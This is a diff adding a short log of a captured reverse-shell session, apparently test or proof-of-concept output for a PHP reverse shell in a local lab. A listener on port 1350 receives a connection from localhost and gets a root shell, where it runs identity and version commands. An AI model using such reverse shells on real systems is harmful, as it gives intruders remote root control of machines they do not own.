@@ -1,0 +1,16 @@
+[*] listener bound on 1350, waiting
+[+] CONNECTION FROM 127.0.0.1:42202
+bash: cannot set terminal process group (1245300): Inappropriate ioctl for device
+bash: no job control in this shell
+]0;root@Rasputin: /tmp/p2s_rev/htmlroot@Rasputin:/tmp/p2s_rev/html# id
+uid=0(root) gid=0(root) groups=0(root)
+]0;root@Rasputin: /tmp/p2s_rev/htmlroot@Rasputin:/tmp/p2s_rev/html# whoami
+root
+]0;root@Rasputin: /tmp/p2s_rev/htmlroot@Rasputin:/tmp/p2s_rev/html# php -v | head -1
+PHP 8.1.2-1ubuntu2.27 (cli) (built: Oct 13 2026 18:55:46) (NTS)
+]0;root@Rasputin: /tmp/p2s_rev/htmlroot@Rasputin:/tmp/p2s_rev/html# uname -r
+6.18.54.1-microsoft-standard-WSL2
+]0;root@Rasputin: /tmp/p2s_rev/htmlroot@Rasputin:/tmp/p2s_rev/html# exit
+exit
+
+[*] session captured
